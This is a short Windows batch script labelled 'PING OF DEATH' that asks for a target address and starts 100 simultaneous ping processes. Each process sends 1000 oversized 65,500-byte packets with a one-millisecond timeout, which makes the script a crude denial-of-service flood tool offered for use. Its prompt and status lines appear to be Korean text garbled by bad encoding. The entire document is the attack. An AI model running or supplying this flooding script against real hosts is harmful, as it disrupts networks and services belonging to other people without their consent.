@echo off
echo.
echo.
echo *** PING OF DEATH ***
echo.
echo ���՗Ϝ�
echo.
echo.
echo ����Ʈ �ּ� �Է�...
echo.
set /p input= �Է� :
echo.
set times=100
FOR /L %%i IN (1,1,%times%) DO (
start ping %input% -l 65500 -n 1000 -w 1
)
echo 100��..
pause